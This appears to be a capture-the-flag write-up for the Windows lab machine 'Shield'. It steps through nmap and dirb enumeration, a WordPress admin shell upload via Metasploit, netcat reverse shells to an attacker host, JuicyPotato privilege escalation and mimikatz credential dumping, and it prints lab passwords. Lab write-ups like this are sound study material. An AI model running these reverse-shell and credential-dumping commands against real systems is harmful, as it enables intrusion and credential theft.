@@ -1,0 +1,62 @@
+Shield is a windows based OS from the starting point labs. Let's enumerate the machine to find some interesting stuff
+
+i. Enumeration
+===============
+# nmap -sC -sV -vvv -T4 --min-rate=1000 -oN shieldscan <ip>
+-> Scanning the machine gives us some interesting open ports
+80 - http
+3306 - mysql
+
+Visiting the http page gives us nothing interesting.So we will try to enumerate any subdirectories for the main domain
+
+#dirb http://<ip>
+- It will automatically search for subdirectories and files from common.txt wordlist
+
+/wordpress is a directory we got while enumeration
+
+Manual visiting through the website gives a login page where we can login as admin
+username : admin
+password : P@s5w0rd!  < Password we found in vaccine lab>
+
+We are now into the admin panel
+
+ii. Initial Access
+===================
+
+-> Open the metasploit and search wp_admin which will result in following exploit
+exploit: exploit/unix/webapp/wp_admin_shell_upload 
+set the appropriate options and exploit
+
+-> thus we have a meterpreter shell but it is not stable.we will make it more stable by upload a nc.exe file and start a netcat listener on attacker machine
+#nc -lvp 1234
+meterpreter>upload nc.exe
+meterpreter>execute -f nc.exe -a " -e cmd.exe <attackerip> 1234"
+
+
+iii. Privilege Escalation
+==========================
+- Running the sysinfo on the system provide us the system information which is vulnerable to juicy-potato attack for privilege escalation
+- Download juicypotato.exe from github
+Open the meterpreter and change directory to uploads and upload the file
+meterpreter> upload /root/Downlaods/juicypotato.exe 
+meterpreter>mv juicypotato.exe js.exe
+
+Go to our previously owned shell and run the following command:
+Create a batch file to be run during our execution and save as shell.bat
+
+> START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.8 4444 
+
+Execute batch file using js.exe and on attacker machine start a netcat listener
+# nc -lvp 4444
+> js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+
+**********We Got root flag on Administrator Desktop***************
+
+meterpreter>upload mimikatz.exe
+shell> ./mimikatz.exe
+mimikatz>sekurlsa::logonpasswords
+### We found some interesting credentials###
+          kerberos :
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
